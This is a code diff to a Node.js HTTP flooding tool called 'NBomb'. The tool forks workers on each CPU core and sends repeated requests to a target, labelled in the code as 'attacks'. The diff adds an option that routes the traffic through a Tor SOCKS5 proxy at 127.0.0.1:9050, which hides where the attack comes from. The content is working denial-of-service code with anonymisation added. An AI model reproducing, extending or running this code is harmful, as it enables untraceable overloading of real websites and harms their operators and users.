@@ -13,6 +13,8 @@ var _os = _interopRequireDefault(require("os"));
 
 var _axios = _interopRequireDefault(require("axios"));
 
+var _socksProxyAgent = _interopRequireDefault(require("socks-proxy-agent"));
+
 require("@babel/polyfill");
 
 function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
@@ -43,6 +45,12 @@ if (_cluster.default.isMaster) {
     type: Number,
     defaultValue: 1000,
     description: "amount to send attacks [default value is 1000]\n"
+  }, {
+    name: "proxy",
+    alias: "p",
+    type: Boolean,
+    defaultValue: false,
+    description: "socks5 proxy [localhost:9050]"
   }, // {
   //   name: "interval",
   //   alias: "i",
@@ -75,6 +83,13 @@ if (_cluster.default.isMaster) {
 
   console.log("NBomb Started");
   console.log("Reading options");
+
+  if (options.proxy) {
+    console.log(_colors.default.green("On Proxy"));
+  } else {
+    console.log(_colors.default.red("NOT USING PROXY!!!"));
+  }
+
   var clusters = []; // Fork workers.
 
   for (var i = 0; i < numCpus; i++) {
@@ -102,10 +117,17 @@ if (_cluster.default.isMaster) {
   }
 } else {
   process.on("message", function (msg) {
-    (0, _axios.default)({
+    var axiosOptions = {
       url: msg.target,
       method: msg.method
-    }).then(function () {
+    };
+    var axiosProxyOptions = {
+      url: msg.target,
+      method: msg.method,
+      httpAgent: new _socksProxyAgent.default("socks5://127.0.0.1:9050"),
+      httpsAgent: new _socksProxyAgent.default("socks5://127.0.0.1:9050")
+    };
+    (0, _axios.default)(msg.proxy ? axiosProxyOptions : axiosOptions).then(function () {
       console.log(_colors.default.green("attack performed ", _colors.default.blue(msg.left)));
     }).catch(function () {
       console.log(_colors.default.red("ERROR ", _colors.default.blue(msg.left)));
